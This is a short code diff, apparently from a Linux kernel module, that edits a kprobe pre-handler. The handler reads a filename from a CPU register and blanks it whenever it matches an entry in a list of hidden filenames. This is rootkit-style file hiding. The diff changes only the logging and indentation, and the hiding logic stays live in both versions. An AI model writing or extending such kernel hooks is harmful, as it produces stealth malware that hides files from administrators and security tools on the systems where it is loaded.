@@ -76,9 +76,11 @@ static struct kprobe kp={
 static int __kprobes pre_handler(struct kprobe *p, struct pt_regs *regs){
     char * filename = (char *)regs->si;
 
-	printk(KERN_INFO "<%s> p->addr = 0x%p, ip = %lx, rdi=%lx, rsi=%s ,flags = 0x%lx\n",
+    printk(KERN_DEBUG "File found: %s" ,filename);
+/*	printk(KERN_INFO "<%s> p->addr = 0x%p, ip = %lx, rdi=%lx, rsi=%s ,flags = 0x%lx\n",
 		p->symbol_name, p->addr, regs->ip, regs->di, (char *)regs->si, regs->flags);
-		if (strcmp(filename, hidden_filenames[0]) == 0) {
+*/
+        if (strcmp(filename, hidden_filenames[0]) == 0) {
 			strcpy((char *)regs->si, "\x00");
 		}
 	return 0;
